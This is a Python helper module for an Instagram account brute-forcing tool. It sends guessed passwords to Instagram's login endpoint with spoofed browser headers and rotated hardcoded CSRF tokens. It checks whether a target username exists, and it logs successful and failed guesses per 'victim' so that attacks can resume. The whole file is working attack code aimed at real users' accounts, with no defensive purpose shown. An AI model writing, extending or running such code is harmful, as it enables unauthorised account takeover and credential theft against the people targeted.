from requests import get, post
from json import loads
from datetime import datetime
import os
import config

login_url = 'https://www.instagram.com/accounts/login/ajax/'

def writeCache(TryPassword, victim, type):
    '''Pass "fail" or "success" in type for type of cache '''
    with open(f"{config.paths[type]}{victim}.txt", "a+") as cache:
        cache.write(TryPassword+"\n")
        cache.close()

def analyse(res, username, password):
    if res['status'] != 'fail':
        if res['user'] == True:
            if res['authenticated'] == True:
                writeCache(password, username, "success")
                return True
            else:
                writeCache(password, username, "fail")
                return False
        else:
            return f"Username {username} dose not exist"
    else:
        return "This attempt got failed"

def login(username, password, csrf):
    '''Try to login using "username", "password","csrf" '''

    data = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    login_header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": csrf
    }
    login_response = post(login_url, data=data, headers=login_header)
    return loads(login_response.text)

def cacheFOUND(victim, path):
    '''Finds the cache files if victim is attaced again'''
    files = os.listdir(path)
    files_txt = [i for i in files if i.endswith('.txt')]
    for i in range(0, len(files_txt)):
        if victim in files_txt[i]:
            return True

def get_csrf(random):
    try:
        lists = ["rvAEsjDrwWxOaVOBarnC1ctC5TQyAfJt","l080nYZjXxNBHtwplUQhwzyqcHncX3ea","QDwpT2O4FDEtnwuDMauykD2zUa6F7N9C","zpCESIXeNRR1sQqWzZRlOdEmgFtGUqdY","WHkcL6hX4QpMuzpuqpCdpj3cVp0aBLG1","JimU4PSwLwzhPMEEIMuMBTdLdHYacj1H","lkYfBtb7VTY0pQCWdrQ25bZM2tRIDUJ7","MnybsMNXadukhYmOVKYKjzH4A9TgdBD2"]
        csrf = lists[random.randint(0, len(lists))]
    except:
        csrf = "JimU4PSwLwzhPMEEIMuMBTdLdHYacj1H"
    return csrf

def uerExists(username):
    try:
        response = get("https://instagram.com/" + username + "/")
        if response.status_code == 404:
            return False
        return True
    except:
        return "NoInternet"

def initialForCache():
    os.makedirs(os.path.dirname(config.paths["success"]), exist_ok=True)
    os.makedirs(os.path.dirname(config.paths["fail"]), exist_ok=True)

def PrintEVEN(arrayText, num):
    for text in arrayText:
        print(f"{text.ljust(num)}", end='')
    print()
